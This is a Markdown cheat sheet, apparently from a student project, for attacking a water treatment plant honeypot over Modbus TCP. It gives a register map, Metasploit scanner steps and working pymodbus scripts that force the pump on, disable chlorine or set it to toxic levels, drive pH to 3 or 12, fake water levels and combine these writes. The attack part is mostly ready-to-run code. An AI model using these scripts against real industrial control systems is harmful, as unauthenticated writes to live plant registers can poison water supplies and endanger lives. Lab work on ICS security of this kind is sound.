# Modbus Attack Cheat Sheet

Quick reference for attacking the water treatment plant honeypot from Ubuntu/Kali VM.

## 🎯 Target Information

- **Modbus TCP Port**: 502
- **HMI Dashboard Port**: 5000
- **Windows Host IP**: Find using `ipconfig` on Windows

## 📋 Modbus Register Map

| Register | Modbus Address | Name | Description | Normal Range |
|----------|---------------|------|-------------|--------------|
| 0 | 40001 | CHLORINE_PPM | Chlorine level (ppm ×10) | 10-40 (1-4 ppm) |
| 1 | 40002 | PH_LEVEL | pH level (×100) | 650-850 (6.5-8.5) |
| 2 | 40003 | PUMP_STATUS | Pump on/off | 0=OFF, 1=ON |
| 3 | 40004 | WATER_LEVEL | Water level (cm) | 0-1000 |
| 4 | 40005 | FLOW_RATE | Flow rate (L/min) | 0-200 |
| 5 | 40006 | TEMPERATURE | Temperature (°C ×10) | 200-300 (20-30°C) |
| 6 | 40007 | PRESSURE | Pressure (PSI ×10) | 50-150 |
| 7 | 40008 | TURBIDITY | Turbidity (NTU ×10) | 5-20 |

## 🚀 Quick Commands

### 1. Find Windows Host IP
```bash
# On Windows PowerShell:
ipconfig

# Look for IPv4 Address (e.g., 192.168.1.100)
```

### 2. Test Connectivity (from Ubuntu VM)
```bash
# Ping test
ping 192.168.1.100

# Port scan
nmap -p 502,5000 192.168.1.100

# Or use netcat
nc -zv 192.168.1.100 502
nc -zv 192.168.1.100 5000
```

### 3. Install Tools (Ubuntu VM)
```bash
# Install Python tools
sudo apt update
sudo apt install python3 python3-pip nmap

# Install pymodbus
pip3 install pymodbus requests beautifulsoup4
```

### 4. Read Process Values
```bash
# Using the read script
python3 modbus_read.py 192.168.1.100

# Quick Python one-liner
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('192.168.1.100', 502)
c.connect()
r = c.read_holding_registers(0, 8, unit=1)
print(f'Chlorine: {r.registers[0]/10} ppm')
print(f'pH: {r.registers[1]/100}')
print(f'Pump: {\"ON\" if r.registers[2]==1 else \"OFF\"}')
c.close()
"
```

### 5. Launch Attacks
```bash
# Run all attacks
python3 modbus_attack.py 192.168.1.100

# Individual attack: Turn pump ON
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('192.168.1.100', 502)
c.connect()
c.write_register(2, 1, unit=1)  # Pump ON
print('Pump turned ON!')
c.close()
"

# Individual attack: Dangerous chlorine level
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('192.168.1.100', 502)
c.connect()
c.write_register(0, 1000, unit=1)  # 100 ppm (DANGEROUS!)
print('Chlorine set to 100 ppm!')
c.close()
"

# Individual attack: Extreme pH
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('192.168.1.100', 502)
c.connect()
c.write_register(1, 300, unit=1)  # pH 3.0 (ACIDIC!)
print('pH set to 3.0!')
c.close()
"
```

## 🎭 Attack Scenarios

### Scenario 1: Unauthorized Pump Control
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Turn pump ON (could overflow tank)
client.write_register(2, 1, unit=1)
print("Pump turned ON - Tank may overflow!")

client.close()
```

### Scenario 2: Chemical Poisoning Attack
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Set chlorine to 0 (no disinfection)
client.write_register(0, 0, unit=1)
print("Chlorine disabled - Water unsafe!")

# Or set to dangerous high level
client.write_register(0, 1000, unit=1)  # 100 ppm
print("Chlorine at toxic levels!")

client.close()
```

### Scenario 3: pH Manipulation
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Extreme acidic
client.write_register(1, 300, unit=1)  # pH 3.0
print("pH now 3.0 - Highly corrosive!")

# Extreme basic
client.write_register(1, 1200, unit=1)  # pH 12.0
print("pH now 12.0 - Caustic!")

client.close()
```

### Scenario 4: Coordinated Attack
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Simultaneous manipulation of multiple controls
attacks = [
    (0, 0, "Disable chlorine"),
    (1, 400, "Set pH to 4.0"),
    (2, 1, "Force pump ON"),
    (3, 50, "Fake low water level"),
]

for register, value, description in attacks:
    client.write_register(register, value, unit=1)
    print(f"[!] {description}")

print("Coordinated attack complete!")
client.close()
```

## 🔍 Monitoring Your Attacks

### View Live Data
```bash
# Monitor HMI Dashboard in browser
firefox http://192.168.1.100:5000

# Continuous read loop
while true; do 
    python3 modbus_read.py 192.168.1.100
    sleep 2
done
```

### Check Logs (on Windows)
```powershell
# View Modbus operations log
Get-Content "C:\Users\...\FYP3\logs\modbus_operations.json" -Tail 20

# Or open in Docker logs
docker-compose logs modbus_simulator -f
```

### Test HMI Dashboard
```bash
# Test HMI access
curl http://192.168.1.100:5000/

# Get API data
curl http://192.168.1.100:5000/api/data

# Run HMI test script
python3 hmi_test.py 192.168.1.100
```

## 🛠️ Using Metasploit (Advanced)

```bash
# Start Metasploit
msfconsole

# Search for SCADA modules
search scada
search modbus

# Example: Use Modbus scanner
use auxiliary/scanner/scada/modbusclient
set RHOSTS 192.168.1.100
set RPORT 502
run
```

## 📝 Custom Attack Script Template

```python
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient
import time

# Configuration
TARGET_IP = '192.168.1.100'
TARGET_PORT = 502

# Connect
client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
client.connect()

print(f"[*] Connected to {TARGET_IP}:{TARGET_PORT}")

# Read current values
result = client.read_holding_registers(0, 8, unit=1)
print(f"[+] Current chlorine: {result.registers[0]/10} ppm")
print(f"[+] Current pH: {result.registers[1]/100}")
print(f"[+] Current pump: {'ON' if result.registers[2] == 1 else 'OFF'}")

# Perform attack
print("[!] Launching attack...")
client.write_register(2, 1, unit=1)  # Turn pump ON
client.write_register(0, 500, unit=1)  # Set chlorine to 50 ppm
print("[+] Attack complete!")

# Verify changes
time.sleep(1)
result = client.read_holding_registers(0, 8, unit=1)
print(f"[+] New chlorine: {result.registers[0]/10} ppm")
print(f"[+] New pump: {'ON' if result.registers[2] == 1 else 'OFF'}")

client.close()
```

## 🔒 Remember

- ⚠️ **Only attack systems you own or have permission to test**
- ⚠️ **This is for educational purposes only**
- ⚠️ **All attacks are logged by the honeypot**
- ⚠️ **Real ICS attacks can cause physical damage and endanger lives**

## 📚 Further Reading

- `README.md` - Detailed documentation
- `../ATTACK_GUIDE.md` - Advanced attack techniques
- `../QUICKSTART.md` - Quick start guide
- PyModbus Docs: https://pymodbus.readthedocs.io/

